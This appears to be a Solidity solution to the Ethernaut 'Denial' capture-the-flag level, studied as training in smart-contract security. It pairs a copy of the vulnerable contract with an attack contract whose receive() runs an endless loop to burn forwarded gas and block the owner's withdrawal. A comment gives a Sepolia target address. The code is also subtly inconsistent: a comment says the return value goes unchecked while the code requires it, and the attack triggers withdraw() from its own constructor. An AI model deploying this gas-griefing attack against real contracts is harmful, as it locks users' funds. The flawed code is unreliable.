// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        (bool ok, ) = partner.call{value: amountToSend}("");
        require(ok);
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract hackdenial {
    // this contract will try to get the gas of after it receive the ether
    // 0x94AF0aaE9fd7f7996C22ac99c267DC07b6D635F8
    address ethernaut; //this is the address of the contract deployed in sepolia ;

    constructor(address _target) {
        ethernaut = _target;
        (bool ok, ) = ethernaut.call(
            abi.encodeWithSignature(
                "setWithdrawPartner(address)",
                address(this)
            )
        );
        require(ok, "set partner fail");
        (bool okk, ) = ethernaut.call(abi.encodeWithSignature("withdraw()"));
        require(okk, "the call withdraw failed");
    }

    // a receive function that will consum all the gas in the contract :
    receive() external payable {
        uint m;
        for (uint i = 1; i > 0; i++) {
            i = m;
        }
    }
}
